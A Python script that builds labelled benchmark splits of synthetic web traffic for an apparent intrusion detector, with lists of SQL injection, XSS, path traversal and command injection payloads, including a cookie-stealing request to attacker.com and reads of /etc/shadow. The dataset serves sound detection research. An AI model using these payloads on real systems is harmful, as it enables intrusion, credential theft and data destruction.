"""
SECURITY GUARD - Benchmark Dataset Generator
Generates reproducible Train / Validation / Test benchmark splits
with balanced normal traffic and diverse attack vectors.
"""

import os
import json
import random

random.seed(42)  # Deterministic reproducibility

OUTPUT_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..', 'datasets', 'benchmark'))

BENIGN_TEMPLATES = [
    ("/", "GET", 200),
    ("/products", "GET", 200),
    ("/products?category=electronics&sort=price_asc", "GET", 200),
    ("/products?category=books&page=2", "GET", 200),
    ("/products/item?id=101", "GET", 200),
    ("/products/item?id=205", "GET", 200),
    ("/products/item?id=310", "GET", 200),
    ("/search?q=wireless+noise+cancelling+headphones", "GET", 200),
    ("/search?q=mechanical+keyboard+rgb", "GET", 200),
    ("/search?q=python+programming+cookbook", "GET", 200),
    ("/search?q=usb-c+hub+multiport+adapter", "GET", 200),
    ("/search?q=4k+gaming+monitor+144hz", "GET", 200),
    ("/profile", "GET", 200),
    ("/profile/orders", "GET", 200),
    ("/profile/settings", "GET", 200),
    ("/dashboard", "GET", 200),
    ("/dashboard/overview", "GET", 200),
    ("/about-us", "GET", 200),
    ("/contact", "GET", 200),
    ("/faq", "GET", 200),
    ("/faq?topic=returns&lang=en", "GET", 200),
    ("/faq?topic=shipping&lang=vi", "GET", 200),
    ("/login", "GET", 200),
    ("/login", "POST", 200),
    ("/logout", "POST", 302),
    ("/cart", "GET", 200),
    ("/cart/items", "POST", 201),
    ("/checkout", "GET", 200),
    ("/checkout/shipping", "POST", 200),
    ("/static/css/main.css", "GET", 304),
    ("/static/js/app.bundle.js", "GET", 304),
    ("/static/images/hero.webp", "GET", 304),
    ("/static/images/logo.svg", "GET", 304),
    ("/api/v1/health", "GET", 200),
    ("/api/v1/categories", "GET", 200),
    ("/api/v1/products?limit=20&offset=40", "GET", 200),
    ("/blog/top-10-cybersecurity-trends", "GET", 200),
    ("/blog/how-to-secure-your-home-wifi", "GET", 200),
    ("/documentation/api/endpoints", "GET", 200),
    ("/help/getting-started", "GET", 200),
    ("/pricing", "GET", 200),
    ("/terms-of-service", "GET", 200),
    ("/privacy-policy", "GET", 200),
    ("/non-existent-page", "GET", 404),
    ("/products/deleted-item", "GET", 404),
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
]

SQLI_ATTACKS = [
    "/search?q=' OR '1'='1",
    "/search?q=' OR 1=1--",
    "/products/item?id=101' OR 1=1--",
    "/products/item?id=1 UNION SELECT null, username, password FROM users--",
    "/api/products?id=-1 UNION ALL SELECT 1,2,3,version()--",
    "/search?q=shoes' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--",
    "/search?q=phone'; DROP TABLE audit_logs;--",
    "/search?q=%27%20OR%201=1--",
    "/search?q=%2527%20OR%201=1--",  # Double encoded
    "/search?q=UN/**/ION/**/SELECT/**/1,2,3--",  # Inline comment
    "/search?q=' or '1'='1' /*",
    "/items?cat=1' waitfor delay '0:0:5'--",
    "/search?q=admin'--",
    "/login?username=admin' OR '1'='1&password=xyz",
    "/api/items?order=id' UNION SELECT 1,table_name FROM information_schema.tables--"
]

XSS_ATTACKS = [
    "/search?q=<script>alert('XSS')</script>",
    "/search?q=<script>alert(document.cookie)</script>",
    "/comment?text=<img src=x onerror=alert(1)>",
    "/profile?bio=<svg onload=alert('XSS')>",
    "/search?q=<iframe src=\"javascript:alert(1)\"></iframe>",
    "/redirect?url=javascript:alert(document.domain)",
    "/search?q=%3Cscript%3Ealert(1)%3C/script%3E",
    "/search?q=%253Cscript%253Ealert(1)%253C/script%253E",  # Double encoded
    "/feedback?msg=<body onload=alert('XSS')>",
    "/search?q=<input autofocus onfocus=alert(1)>",
    "/search?q=<a href=\"javascript:confirm(1)\">Click</a>",
    "/search?q=&lt;script&gt;alert(1)&lt;/script&gt;",
    "/forum/post?content=<img src=1 onerror=fetch('http://attacker.com/?c='+document.cookie)>",
    "/preview?html=<marquee onstart=alert(1)>test</marquee>",
    "/search?q=<video><source onerror=\"javascript:alert(1)\"></video>"
]

PATH_TRAVERSAL_ATTACKS = [
    "/download?file=../../../../etc/passwd",
    "/download?file=..\\..\\..\\windows\\win.ini",
    "/view?doc=../../../../etc/shadow",
    "/static?path=..%2f..%2f..%2fetc%2fpasswd",
    "/static?path=..%252f..%252f..%252fetc%252fpasswd",
    "/files?name=....//....//....//etc/passwd",
    "/api/export?path=../../conf/application.properties",
    "/images?img=..\\..\\..\\boot.ini",
    "/read?file=/var/log/../../../../etc/hosts",
    "/files?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
]

COMMAND_INJECTION_ATTACKS = [
    "/api/ping?host=127.0.0.1; whoami",
    "/api/ping?host=127.0.0.1 | whoami",
    "/api/ping?host=127.0.0.1 && cat /etc/passwd",
    "/api/dns?domain=google.com | dir",
    "/api/diagnostics?target=localhost; ls -la",
    "/tools/traceroute?ip=8.8.8.8 | powershell -Command Get-Process",
    "/system/backup?name=test `whoami`",
    "/system/run?cmd=127.0.0.1; /bin/sh -c 'id'",
    "/api/convert?file=input.png; rm -rf /tmp/*",
    "/api/ping?host=127.0.0.1 | cat /etc/shadow"
]

BRUTE_FORCE_ATTACKS = [
    ("/login", "POST", 401, "/login brute force attempt round 1"),
    ("/login", "POST", 401, "/login brute force attempt round 2"),
    ("/login", "POST", 401, "/login brute force attempt round 3"),
    ("/login", "POST", 401, "/login brute force attempt round 4"),
    ("/login", "POST", 401, "/login brute force attempt round 5"),
    ("/api/v1/auth/token", "POST", 401, "/api token stuffing variant 1"),
    ("/api/v1/auth/token", "POST", 401, "/api token stuffing variant 2"),
    ("/admin/login", "POST", 401, "/admin login dictionary attack"),
    ("/wp-login.php", "POST", 404, "WordPress scanner probe"),
    ("/login", "POST", 429, "Rate limit threshold reached")
]


def generate_sample(sample_id: int, url: str, method: str, status_code: int, category: str, label: int, attack_vector: str) -> dict:
    return {
        "id": sample_id,
        "timestamp": f"2026-11-04T12:{random.randint(10, 59):02d}:{random.randint(10, 59):02d}.000Z",
        "ip": f"198.51.{random.randint(10, 200)}.{random.randint(2, 250)}",
        "method": method,
        "url": url,
        "statusCode": status_code,
        "userAgent": random.choice(USER_AGENTS),
        "responseTime": round(random.uniform(8.0, 65.0), 1),
        "category": category,
        "label": label,  # 0 = Benign, 1 = Attack
        "attack_vector": attack_vector
    }


def build_split(benign_count: int, attack_counts: dict, start_id: int) -> tuple:
    samples = []
    current_id = start_id

    # 1. Benign Samples
    for _ in range(benign_count):
        tmpl = random.choice(BENIGN_TEMPLATES)
        sample = generate_sample(
            current_id, tmpl[0], tmpl[1], tmpl[2],
            category="BENIGN", label=0, attack_vector="none"
        )
        samples.append(sample)
        current_id += 1

    # 2. SQL Injection
    for _ in range(attack_counts.get("sql_injection", 0)):
        url = random.choice(SQLI_ATTACKS)
        sample = generate_sample(
            current_id, url, "GET", 200,
            category="ATTACK", label=1, attack_vector="sql_injection"
        )
        samples.append(sample)
        current_id += 1

    # 3. XSS
    for _ in range(attack_counts.get("xss", 0)):
        url = random.choice(XSS_ATTACKS)
        sample = generate_sample(
            current_id, url, "GET", 200,
            category="ATTACK", label=1, attack_vector="xss"
        )
        samples.append(sample)
        current_id += 1

    # 4. Path Traversal
    for _ in range(attack_counts.get("path_traversal", 0)):
        url = random.choice(PATH_TRAVERSAL_ATTACKS)
        sample = generate_sample(
            current_id, url, "GET", 200,
            category="ATTACK", label=1, attack_vector="path_traversal"
        )
        samples.append(sample)
        current_id += 1

    # 5. Command Injection
    for _ in range(attack_counts.get("command_injection", 0)):
        url = random.choice(COMMAND_INJECTION_ATTACKS)
        sample = generate_sample(
            current_id, url, "GET", 200,
            category="ATTACK", label=1, attack_vector="command_injection"
        )
        samples.append(sample)
        current_id += 1

    # 6. Brute Force
    for _ in range(attack_counts.get("brute_force", 0)):
        bf = random.choice(BRUTE_FORCE_ATTACKS)
        sample = generate_sample(
            current_id, bf[0], bf[1], bf[2],
            category="ATTACK", label=1, attack_vector="brute_force"
        )
        samples.append(sample)
        current_id += 1

    # Shuffle deterministically
    random.shuffle(samples)
    return samples, current_id


def main():
    os.makedirs(OUTPUT_DIR, exist_ok=True)

    # 70% Train: 1400 total (1200 benign, 200 attacks for reference)
    train_samples, next_id = build_split(
        benign_count=1200,
        attack_counts={"sql_injection": 50, "xss": 50, "path_traversal": 40, "command_injection": 30, "brute_force": 30},
        start_id=1
    )

    # 15% Validation: 300 total (200 benign, 100 attacks)
    val_samples, next_id = build_split(
        benign_count=200,
        attack_counts={"sql_injection": 25, "xss": 25, "path_traversal": 20, "command_injection": 15, "brute_force": 15},
        start_id=next_id
    )

    # 15% Test (Held-out Benchmark Evaluation): 300 total (200 benign, 100 attacks)
    test_samples, next_id = build_split(
        benign_count=200,
        attack_counts={"sql_injection": 25, "xss": 25, "path_traversal": 20, "command_injection": 15, "brute_force": 15},
        start_id=next_id
    )

    # Write files
    for name, data in [("train.jsonl", train_samples), ("validation.jsonl", val_samples), ("test.jsonl", test_samples)]:
        file_path = os.path.join(OUTPUT_DIR, name)
        with open(file_path, "w", encoding="utf-8") as f:
            for item in data:
                f.write(json.dumps(item) + "\n")
        print(f"Generated {name}: {len(data)} records -> {file_path}")

    # Write Dataset Schema & README.md
    readme_content = f"""# Benchmark Datasets: Security Guard Academic Evaluation

## 1. Dataset Provenance & Split Architecture
Standardized evaluation dataset partitions for empirical validation and ablation study:

- `train.jsonl`: 1,400 records (1,200 Benign, 200 Multi-vector Attacks)
- `validation.jsonl`: 300 records (200 Benign, 100 Multi-vector Attacks)
- `test.jsonl`: 300 records (200 Benign, 100 Multi-vector Attacks) - **Held-out for uncorrupted testing**

## 2. Attack Vector Coverage
Evaluated attack distributions across 5 distinct categories:
1. **SQL Injection (SQLi)**: Tautologies, UNION-selects, stacked queries, time-based sleep, comment splitting, and double-URL encoding.
2. **Cross-Site Scripting (XSS)**: Script tags, SVG/IMG onerror event handlers, pseudo-protocols, HTML entities, and iframe injection.
3. **Path Traversal**: Parent directory references (`../`, `..\\\\`), double-encoded dots (`%252e%252e%252f`), absolute system files.
4. **Command Injection**: Shell metacharacters (`;`, `|`, `&&`, backticks, powershell, /bin/sh).
5. **Credential Stuffing & Brute Force**: Repeated authentication failures, rate limit bursts, dictionary attacks.

## 3. Record Schema
Each line in `*.jsonl` adheres to this schema:
```json
{{
  "id": 101,
  "timestamp": "2026-11-04T12:30:15.000Z",
  "ip": "198.51.100.42",
  "method": "GET",
  "url": "/search?q=' OR 1=1--",
  "statusCode": 200,
  "userAgent": "Mozilla/5.0 ...",
  "responseTime": 18.5,
  "category": "ATTACK",
  "label": 1,
  "attack_vector": "sql_injection"
}}
```
"""
    with open(os.path.join(OUTPUT_DIR, "README.md"), "w", encoding="utf-8") as f:
        f.write(readme_content)
    print("Generated README.md in datasets/benchmark/")


if __name__ == "__main__":
    main()
